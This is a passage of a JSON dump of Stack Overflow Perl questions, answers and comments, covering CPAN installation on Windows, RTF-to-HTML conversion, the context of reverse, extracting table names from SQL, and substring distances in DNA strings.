<code>gmake</code>"}], "tags": [], "owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "is_accepted": true, "score": 3, "last_activity_date": 1494934555, "last_edit_date": 1494934555, "creation_date": 1494916641, "answer_id": 43994094, "question_id": 43988509, "link": "https://stackoverflow.com/questions/43988509/having-trouble-installing-a-cpan-module-on-strawberry-perl-running-on-windows-7/43994094#43994094", "title": "Having trouble installing a CPAN module on Strawberry Perl running on Windows 7", "body": "<p>Try the following:</p>\n\n<ol>\n<li><p>Do not use separate MinGW it already comes packed with Strawberry Perl. Make sure you have a recent version of Strawberry Perl.</p></li>\n<li><p>Download the tar.gz for the perl module from any of the sites(Metacpan or Cpan).</p></li>\n<li><p>Use winzip to unzip it which will give you all files extracted to a location.</p></li>\n<li><p>Now open command prompt and change directory to the one where you extracted the tar.gz for the perl module.</p></li>\n<li><p>Run the following commands then:</p>\n\n<ul>\n<li>perl Makefile.pl</li>\n<li>dmake</li>\n<li>dmake test</li>\n<li>dmake install</li>\n</ul></li>\n</ol>\n\n<p>The command dmake test one is optional, if you get errors here try skipping to the next command and try using the module in your scripts. As many times the test fails does not means the module won't install or work properly. If there is error the module will give error in installation too.</p>\n\n<p>Make sure you have the Makefile.pl file in the extracted directory. This will install the module without any issues.</p>\n\n<p>I am assuming that you are working on a Windows system. Do let me know if you face any errors still.</p>\n"}], "owner": {"reputation": 33, "user_id": 6652102, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207722009316953/picture?type=large", "display_name": "Joel Fuhrmann", "link": "https://stackoverflow.com/users/6652102/joel-fuhrmann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3348, "favorite_count": 0, "accepted_answer_id": 43994094, "answer_count": 1, "score": 3, "last_activity_date": 1494934555, "creation_date": 1494881071, "question_id": 43988509, "link": "https://stackoverflow.com/questions/43988509/having-trouble-installing-a-cpan-module-on-strawberry-perl-running-on-windows-7", "title": "Having trouble installing a CPAN module on Strawberry Perl running on Windows 7", "body": "<p>I've got Strawberry Perl installed on a Windows 7 system. Also have a MinGW installation located in C:\\MinGW\\msys\\bin (where my make.exe resides). Strawberry is located in c:\\Strawberry\\Perl\\bin.</p>\n\n<p>I'm trying to install HTML::TableContentParser into a local library, and the script that installs the module fails with a \"cannot find the path specified\" error, and tells me to build manually, which I don't know how to do, and have been unable to find instructions that work. It always comes back to the makefile somehow.</p>\n\n<p>Here's what I get when I run \"cpan HTML::TableContentParser\" from my c:\\strawberry\\perl\\bin directory:  </p>\n\n<pre><code>C:\\Users\\joel&gt;cd c:\\strawberry\\perl\\bin\n\nc:\\Strawberry\\perl\\bin&gt;cpan HTML::TableContentParser\nLoading internal null logger. Install Log::Log4perl for logging messages\nCPAN: Storable loaded ok (v2.56_01)\nReading '\\c\\Users\\joel\\.cpan\\Metadata'\n  Database was generated on Mon, 15 May 2017 15:54:01 GMT\nRunning install for module 'HTML::TableContentParser'\nCPAN: Digest::SHA loaded ok (v5.96)\nCPAN: Compress::Zlib loaded ok (v2.07)\nChecksum for \\c\\Users\\joel\\.cpan\\sources\\authors\\id\\S\\SD\\SDRABBLE\\HTML-       TableContentParser-0.13.tar.gz ok\nThe system cannot find the path specified.\nUncompressed \\c\\Users\\joel\\.cpan\\sources\\authors\\id\\S\\SD\\SDRABBLE\\HTML-TableContentParser-0.13.tar.gz successfully\nUsing Tar:/usr/bin/tar xf \"HTML-TableContentParser-0.13.tar\":\nThe system cannot find the path specified.\nCouldn't untar HTML-TableContentParser-0.13.tar: child exited with value 1\nCPAN: YAML loaded ok (v1.21)\n  SDRABBLE/HTML-TableContentParser-0.13.tar.gz\n  Had problems unarchiving. Please build manually\n</code></pre>\n"}, {"tags": ["perl", "rtf", "lwp"], "comments": [{"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494886254, "post_id": 43987823, "comment_id": 75008312, "body": "I&#39;m not sure what your question is. The output of RTF::HTML::Converter seems, with the examples I tried, to be perfectly valid HTML. The &#39;malformed header&#39; seems to indicate you are not setting a correct header. How about using a modern web framework?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494920378, "post_id": 43987823, "comment_id": 75018971, "body": "@bytepusher we don&#39;t know if the OP controls the remote server. It sounds like they don&#39;t, but have verified that the conversion part is working as expected when run locally. They might not have understood what the error means and where it comes from though."}, {"owner": {"reputation": 2666, "user_id": 1090360, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/VRQdK.jpg?s=128&g=1", "display_name": "JackTheKnife", "link": "https://stackoverflow.com/users/1090360/jacktheknife"}, "edited": false, "score": 0, "creation_date": 1494938987, "post_id": 43987823, "comment_id": 75032123, "body": "I need to parse RTF email attachments for a &quot;preview&quot; (in an iframe). No clue why but I get two headers - first correct one from the <code>print &quot;Content-type: text&#47;html\\n\\n&quot;;</code> and then second one from parsed HTML. I have read that <code>RTF::HTMLConverter</code> may be better choice but I don&#39;t know why I can&#39;t install <code>XML::GDOME</code> which is required by that library."}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494962298, "post_id": 43987823, "comment_id": 75047776, "body": "So you are not using RTF::HTMLConverter, but some other code is producing incorrect headers? Regarding the installation, you may want to post a different question to get help with that."}, {"owner": {"reputation": 2666, "user_id": 1090360, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/VRQdK.jpg?s=128&g=1", "display_name": "JackTheKnife", "link": "https://stackoverflow.com/users/1090360/jacktheknife"}, "reply_to_user": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494962779, "post_id": 43987823, "comment_id": 75048075, "body": "@bytepusher <code>RTF::HTML::Converter</code> and <code>RTF::HTMLConverter</code> are two different libs"}], "owner": {"reputation": 2666, "user_id": 1090360, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/VRQdK.jpg?s=128&g=1", "display_name": "JackTheKnife", "link": "https://stackoverflow.com/users/1090360/jacktheknife"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 161, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1494920293, "creation_date": 1494878370, "last_edit_date": 1494920293, "question_id": 43987823, "link": "https://stackoverflow.com/questions/43987823/convert-rtf-from-url-to-html", "title": "Convert RTF from URL to HTML", "body": "<p>I have tried to convert RTF to HTML using the Perl library <code>RTF::HTML::Converter</code>. All works fine under a console and when source is located as a local path but when I have tried to access that file via URL it brings regular RTF not HTML</p>\n\n<p>My code looks like:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse RTF::HTML::Converter;\nuse LWP::Simple;        \n\nmy $url = \"http://somesite.com/docs/example_file.rtf\";\nmy $htmlOut;\nmy $content = get($url);\nmy $object = RTF::HTML::Converter-&gt;new( output =&gt; \\$htmlOut);\n$object-&gt;parse_stream($content); \n\nprint \"Content-type: text/html\\n\\n\";    \nprint $htmlOut;\n</code></pre>\n\n<p>Any tips on what I'm doing wrong? Also how can I get displayed HTML output instead to <code>STDOUT</code>? Trying to output to the browser I'm getting that error:</p>\n\n<p><code>malformed header from script. Bad header=&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" []&gt;</code></p>\n"}, {"tags": ["arrays", "perl", "foreach", "find"], "comments": [{"owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "edited": false, "score": 0, "creation_date": 1494878867, "post_id": 43987805, "comment_id": 75005092, "body": "find ./ -name &quot;feedback_tac*&quot; | xargs grep &quot;position director&quot;"}, {"owner": {"reputation": 11, "user_id": 3159380, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3e8d2dee9809af390b4235ba0410b0d?s=128&d=identicon&r=PG&f=1", "display_name": "user3159380", "link": "https://stackoverflow.com/users/3159380/user3159380"}, "reply_to_user": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "edited": false, "score": 0, "creation_date": 1494880619, "post_id": 43987805, "comment_id": 75005931, "body": "Wow, I was making that waaaay harder than it needed to be... That was perfect and succinct, thank you so much!"}, {"owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "edited": false, "score": 0, "creation_date": 1494881742, "post_id": 43987805, "comment_id": 75006500, "body": "You are welcome! :)"}], "answers": [{"tags": [], "owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "is_accepted": false, "score": 0, "last_activity_date": 1494881401, "creation_date": 1494881401, "answer_id": 43988588, "question_id": 43987805, "link": "https://stackoverflow.com/questions/43987805/pull-info-from-all-files-that-include-feedback-from-several-different-directo/43988588#43988588", "title": "pull info from all files that include &quot;feedback&quot; (from several different directories)?", "body": "<pre><code>find ./ -name \"feedback_tac*\" | xargs grep \"position director\"\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 3159380, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3e8d2dee9809af390b4235ba0410b0d?s=128&d=identicon&r=PG&f=1", "display_name": "user3159380", "link": "https://stackoverflow.com/users/3159380/user3159380"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 25, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1494881401, "creation_date": 1494878314, "last_edit_date": 1494879261, "question_id": 43987805, "link": "https://stackoverflow.com/questions/43987805/pull-info-from-all-files-that-include-feedback-from-several-different-directo", "title": "pull info from all files that include &quot;feedback&quot; (from several different directories)?", "body": "<p>I've been searching to find a way to pull out a matching line from certain files in several different directories. \n--The phrase I'm searching for: \"position director\"\n--The file name it's found in: \"feedback_tac*\" (each feedback_tac has a different numerical ending, hence the \"*\")\n--The \"feedback_tac\" files are found in directories structured like this:</p>\n\n<p>~  /May/05012017/emcee/log1234/current/feedback_tac</p>\n\n<p>~  /May/05022017/emcee/log2345/current/feedback_tac</p>\n\n<p>~  /May/05032017/emcee/log3456/current/feedback_tac</p>\n\n<p>~  /May/05042017/emcee/log45767/current/feedback_tac</p>\n\n<p>~  /May/05052017/emcee/log873565/current/feedback_tac</p>\n\n<p>~  /May/05062017/emcee/log9610/current/feedback_tac</p>\n\n<p>if I use: find . -name \"feedback_tac*\" I get a listing of all the files I need, but I'm having trouble putting them through the foreach loop, or creating an array. I've done some foreach loops before, but this one is giving me fits for some reason. </p>\n\n<p>(Unix AIX, and perl v5.6.1):</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1494870540, "post_id": 43985679, "comment_id": 75000816, "body": "Re &quot;<i>why the inconsistency?</i>&quot;, What inconsistency?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1494870589, "post_id": 43985679, "comment_id": 75000834, "body": "Re &quot;<i>because reverse should be called in scalar contest to be useful</i>&quot;, nonsense. <code>say for reverse qw( abc def ghi );</code>"}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 0, "last_activity_date": 1501903969, "last_edit_date": 1501903969, "creation_date": 1494871902, "answer_id": 43986197, "question_id": 43985679, "link": "https://stackoverflow.com/questions/43985679/inconsistency-in-misuse-of-reverse-in-list-context/43986197#43986197", "title": "Inconsistency in misuse of &quot;reverse&quot; in list context", "body": "<p>The <a href=\"http://perldoc.perl.org/functions/reverse.html\" rel=\"nofollow noreferrer\">reverse</a> can indeed be used in either scalar context</p>\n\n<pre><code>perl -wE'$w = \"hello\"; $r = reverse $w; say $r'  # olleh\n</code></pre>\n\n<p>or in list context</p>\n\n<pre><code>perl -wE'say join \" \", reverse qw(hello there)'  # there hello\n</code></pre>\n\n<p>Both are useful and there is no \"<em>inconsistency</em>\" in these behaviors.</p>\n\n<p>One thing to watch out for is that when a list is used in scalar context </p>\n\n<pre><code>perl -wE'say scalar reverse qw(hello there)'  # erehtolleh\n</code></pre>\n\n<p>then the list gets concatenated and <code>reverse</code> returns a string with characters in reverse order.</p>\n\n<hr>\n\n<p>I am adding another \"gotcha\" for completeness, even as it has been covered in other answers.</p>\n\n<p>The <code>reverse</code> defaults to <code>$_</code> in scalar context, as expected. However, in list context it just doesn't take <code>$_</code>, and in <code>for (@ary) { print reverse; }</code>, with list context imposed on it by <code>print</code>, it has no arguments and thus prints nothing.</p>\n"}, {"comments": [{"owner": {"reputation": 3984, "user_id": 1801086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef4c0400ffff14d5e1c16ca3856c09ba?s=128&d=identicon&r=PG", "display_name": "tjd", "link": "https://stackoverflow.com/users/1801086/tjd"}, "edited": false, "score": 1, "creation_date": 1494872580, "post_id": 43986286, "comment_id": 75001925, "body": "More precisely, while <code>reverse()</code> will use <code>$_</code> in scalar context, <code>print</code> imposes list context."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1494873158, "last_edit_date": 1495540986, "creation_date": 1494872262, "answer_id": 43986286, "question_id": 43985679, "link": "https://stackoverflow.com/questions/43985679/inconsistency-in-misuse-of-reverse-in-list-context/43986286#43986286", "title": "Inconsistency in misuse of &quot;reverse&quot; in list context", "body": "<blockquote>\n  <p>print reverse foreach (\"word\"); # prints nothing (empty string)</p>\n</blockquote>\n\n<p>What you have written is</p>\n\n<pre><code>for ( 'word' ) {\n    print reverse();\n}\n</code></pre>\n\n<p>That code clearly executes the loop just once with <code>$_</code> set to <code>word</code>, and prints a reversed empty list</p>\n\n<p>Perhaps you should avoid statement modifiers until you are more familiar with the language</p>\n\n<p>As <a href=\"https://stackoverflow.com/questions/43985679/inconsistency-in-misuse-of-reverse-in-list-context/43986286?noredirect=1#comment75001925_43986286\"><strong>tjd</strong> comments</a>, <code>reverse</code> will reverse either a list or a string. In list context (as imposed by the call to <code>print</code>) it expects a list of parameters to reverse, and ignores <code>$_</code>. In scalar context it would just concatenate all parameters passed to it and reverse the resulting string; in the absence of any parameters it will reverse the string in <code>$_</code></p>\n"}, {"comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1494876061, "post_id": 43986292, "comment_id": 75003752, "body": "Mention that in scalar context only, it defaults to $_"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1494877688, "post_id": 43986292, "comment_id": 75004596, "body": "@ysth, done. . ."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": -1, "last_activity_date": 1494878002, "last_edit_date": 1494878002, "creation_date": 1494872283, "answer_id": 43986292, "question_id": 43985679, "link": "https://stackoverflow.com/questions/43985679/inconsistency-in-misuse-of-reverse-in-list-context/43986292#43986292", "title": "Inconsistency in misuse of &quot;reverse&quot; in list context", "body": "<p>In scalar context, <code>reverse</code> reverses the characters of a string.</p>\n\n<pre><code>my $s = \"abc\";\n$s = reverse($s);\nsay $s;\n# cba\n</code></pre>\n\n<p>In list context, <code>reverse</code> reverses the scalars of its argument list.</p>\n\n<pre><code>my @a = qw( abc def ghi );\n@a = reverse(@a);\nsay \"@a\";\n# ghi def abc\n</code></pre>\n\n<p>Clearly, both uses are very consistent with each other. The only possible lack of consistency between scalar-context <code>reverse</code> and list-context <code>reverse</code> is what happens when you provide no argument expression. Scalar-context <code>reverse</code> defaults to using <code>$_</code>, but doing so would make no sense for list-context <code>reverse</code>, so it doesn't treat that case specially.</p>\n\n<p>That means the reason <code>print reverse for \"word\";</code> prints nothing is that the reverse of zero items is zero items.</p>\n"}], "owner": {"reputation": 11, "user_id": 8015623, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bafbb691f2211348eb7e371f9ebd08d3?s=128&d=identicon&r=PG&f=1", "display_name": "corona79", "link": "https://stackoverflow.com/users/8015623/corona79"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "closed_date": 1494922915, "answer_count": 3, "score": -1, "last_activity_date": 1501903969, "creation_date": 1494870051, "last_edit_date": 1495044490, "question_id": 43985679, "link": "https://stackoverflow.com/questions/43985679/inconsistency-in-misuse-of-reverse-in-list-context", "closed_reason": "Not suitable for this site", "title": "Inconsistency in misuse of &quot;reverse&quot; in list context", "body": "<pre><code>print reverse \"word\"; # prints 'word'\n</code></pre>\n\n\n\n<pre><code>print reverse foreach (\"word\"); # prints nothing (empty string)\n</code></pre>\n\n<p>I am using Perl v5.24.</p>\n\n<p>list context is forced by <code>print</code>, and these statements are \"bad\" \n because <code>reverse</code> should be called in scalar contest to be useful.</p>\n\n<p>Nevertheless, why the inconsistency?</p>\n"}, {"tags": ["oracle", "perl", "unix"], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 5, "last_activity_date": 1494876247, "last_edit_date": 1494876247, "creation_date": 1494850279, "answer_id": 43979221, "question_id": 43979070, "link": "https://stackoverflow.com/questions/43979070/error-executing-sql-using-perl/43979221#43979221", "title": "Error executing SQL using Perl", "body": "<p>Two important skills to learn as a programmer are a) accuracy in following instructions and b) reading the error message carefully.</p>\n\n<p>You started by running <code>GetTable.pl</code>. But that program requires a parameter (the name of an SQL file to analyse) and the error message tried to tell you that.</p>\n\n<p>I don't know why, but instead of doing what the error message told you to do (which would have been to run <code>perl GetTable.pl test.sql</code>) you decided to ask Perl to run your SQL file.</p>\n\n<p>The second error message you got was the Perl compiler trying to make sense of the SQL that you asked it to run. But the Perl compiler doesn't understand SQL, it understands Perl. So it's no surprise that it got confused.</p>\n\n<p>To fix it, do what your first error message suggested\u2014run the command</p>\n\n<pre>$ perl GetTable.pl test.sql</pre>\n"}], "owner": {"reputation": 1, "user_id": 8013952, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e029b006c2ebd26d2ed34c5c6c5f6f2?s=128&d=identicon&r=PG&f=1", "display_name": "Sravs", "link": "https://stackoverflow.com/users/8013952/sravs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "answer_count": 1, "score": -5, "last_activity_date": 1494876247, "creation_date": 1494849844, "last_edit_date": 1592644375, "question_id": 43979070, "link": "https://stackoverflow.com/questions/43979070/error-executing-sql-using-perl", "title": "Error executing SQL using Perl", "body": "\n<p>I am trying to execute the open source code which finds the list of tables involved in SQL.</p>\n<p>I am working on <a href=\"http://www.theunixschool.com/2012/03/retrieve-table-names-from-oracle.html\" rel=\"nofollow noreferrer\"><em>Retrieve table names from Oracle queries</em></a>.</p>\n<p>I understood the expressions and commands to some extent and tried it.</p>\n<p>Details of my execution:</p>\n<ol>\n<li><p><code>GetTable.pl</code> file<br />\nsame as in the link</p>\n</li>\n<li><p><code>test.sql</code> file<br />\nI didn't use the one in link. Instead I had only a single SQL for testing.<br />\n<code>SELECT emp_name FROM load_tables.temp</code>;</p>\n</li>\n<li><p>Executed in Strawberry Perl</p>\n</li>\n</ol>\n<p>I tried the following</p>\n<pre class=\"lang-none prettyprint-override\"><code>$ perl GetTable.pl\n\nUsage : GetTable &lt;sql query file&gt;\n</code></pre>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ perl test.sql\n\nCan't locate object method &quot;FROM&quot; via package &quot;load_tables&quot; (perhaps you forgot to load &quot;load_tables&quot;?) at test.sql line 1\n</code></pre>\n<p>Can someone help me in executing it? I'm not sure if there is problem with code as I could see two people have executed successfully.</p>\n<h3>Perl code</h3>\n<pre class=\"lang-none prettyprint-override\"><code>#!/usr/bin/perl\n\nuse warnings;\n\n#Function which gets the table names and formats and prints them.\n\nsub printTable {\n    my $tab = shift;\n    $tab =~ s/,\\s+/,/g;\n    $tab =~ s/\\s+,/,/g;\n\n    my @out = split( /,/, $tab );\n\n    foreach ( @out ) {\n        $_ =~ s/ .*//;\n        print $opr, $_, &quot;\\n&quot;;\n    }\n}\n\n# Function which gets the indivdual queries and separtes the table\n# names from the queries. Sub-Queries, co-related queries, etc..\n# will also be handled.\n\nsub process {\n    local $opr;\n    my $line = shift;\n    $line =~ s/\\n/ /g;\n\n    if ( $line =~ m/^\\s*(select|delete)/i ) {\n        if ( $line =~ m/^\\s*select/i ) {\n            $opr = &quot;SELECT: &quot;;\n        }\n        else {\n            $opr = &quot;DELETE: &quot;;\n        }\n        if ( $line =~ m/from.*where/i ) {\n            while ( $line =~ m/from\\s+(.*?)where/ig ) {\n                &amp;printTable( $1 );\n            }\n        }\n        elsif ( $line =~ m/from.*;/i ) {\n            while ( $line =~ m/from\\s+(.*);/ig ) {\n                &amp;printTable( $1 );\n            }\n        }\n    }\n    elsif ( $line =~ m/^\\s*update\\s+(\\w+)\\s+/i ) {\n        $opr = &quot;UPDATE: &quot;;\n        &amp;printTable( $1 );\n    }\n    elsif ( $line =~ m/^\\s*insert\\s+into\\s+(\\w+)\\s+/i ) {\n        $opr = &quot;INSERT: &quot;;\n        &amp;printTable( $1 );\n    }\n}\n\n#The main function which reads the files and reads the\n#query into a variable and sends it to process function.\n\nif ( @ARGV != 1 ) {\n    print &quot;Usage: GetTable &lt;sql query file&gt;\\n&quot;;\n    exit 1;\n}\n\nopen QFILE, $ARGV[0] or die &quot;File $ARGV[0]: $! \\n&quot;;\n\nmy $flag  = 0;\nmy $query = &quot;&quot;;\nmy $conds = &quot;select|insert|update|delete&quot;;\n\nwhile ( &lt;QFILE&gt; ) {\n\n    next if ( /^$/ );\n\n    if ( $flag == 1 ) {\n        $query .= $_;\n        if ( /;\\s*$/ ) {\n            $flag = 0;\n            &amp;process( $query );\n        }\n    }\n    elsif ( /^\\s*($conds).*;\\s*/i ) {\n        &amp;process( $_ );\n    }\n    elsif ( /^\\s*($conds)/i ) {\n        $flag  = 1;\n        $query = $_;\n    }\n}\n\nclose QFILE;\n</code></pre>\n"}, {"tags": ["string", "perl", "substring", "distance"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 2, "creation_date": 1494845636, "post_id": 43976505, "comment_id": 74984460, "body": "See <a href=\"https://stackoverflow.com/help/how-to-ask\">How do I ask a good question?</a>. SO is not a code writing service. You need to try first, and ask about a specific problem. I generally do not recommend answering posts when it is obvious the OP just wants other people to do their work."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494849701, "post_id": 43976505, "comment_id": 74987026, "body": "What do you mean by &quot;distance between&quot;? What results do you expect from this data?"}], "answers": [{"tags": [], "owner": {"reputation": 9137, "user_id": 4295017, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53186503963b4007f9107bd53e151966?s=128&d=identicon&r=PG&f=1", "display_name": "Dmitry Egorov", "link": "https://stackoverflow.com/users/4295017/dmitry-egorov"}, "is_accepted": false, "score": 0, "last_activity_date": 1494856160, "last_edit_date": 1494856160, "creation_date": 1494844046, "answer_id": 43977119, "question_id": 43976505, "link": "https://stackoverflow.com/questions/43976505/distance-between-matched-substrings/43977119#43977119", "title": "Distance between matched substrings", "body": "<p>You may <code>split</code> your input string by <code>\"ACGT\"</code> and remove the first and the last elements of the returned array to get all fragments between <code>\"ACGT\"</code>. Then calculate lengths of this fragments:</p>\n\n<pre><code>my $input = \"AACCGGTTACGTTTGGCCAAACGTTTTTTGGGGAAACCCACGTACGTAAAGCCGGTTAAACGT\";\nmy @fragments = split(\"ACGT\", $input, -1);\n@fragments = @fragments[1..$#fragments - 1];\nmy @dist_arr = map {length} @fragments;\n</code></pre>\n\n<p>Demo: <a href=\"https://ideone.com/AqEwGu\" rel=\"nofollow noreferrer\">https://ideone.com/AqEwGu</a></p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494849997, "post_id": 43977297, "comment_id": 74987222, "body": "That&#39;s pretty much what I would write. But we don&#39;t really know what the OP means by <i>distance between</i>, and they are quite likely to want the number of bases from the start of one subsequence to the start of the next."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494856071, "post_id": 43977297, "comment_id": 74991437, "body": "It&#39;s easy to add 4 if that&#39;s the case."}], "tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, 